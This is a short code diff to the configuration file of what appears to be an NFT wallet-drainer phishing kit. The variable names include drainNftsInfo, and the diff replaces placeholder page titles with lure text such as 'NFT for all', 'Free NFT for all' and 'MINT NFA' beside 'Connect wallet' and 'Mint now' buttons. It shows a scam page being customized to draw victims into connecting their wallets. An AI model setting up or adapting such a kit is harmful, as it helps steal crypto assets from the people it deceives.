@@ -11,7 +11,7 @@ const collectionInfo = {
 
 const indexPageInfo = {
     backgroundImage: "background.jpg", // relative path to background image (in assets)
-    title: "{name}", // {name} will be replaced with collectionInfo.name
+    title: "NFT for all", // {name} will be replaced with collectionInfo.name
     underTitle: "Free NFT for all",
 }
 
@@ -33,7 +33,7 @@ const drainNftsInfo = {
 }
 
 const customStrings = {
-    title: "MINT {name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
+    title: "MINT NFA", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
     connectButton: "Connect wallet",
     transferButton: "Mint now",
     dateString: "Pre sale available {date}", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
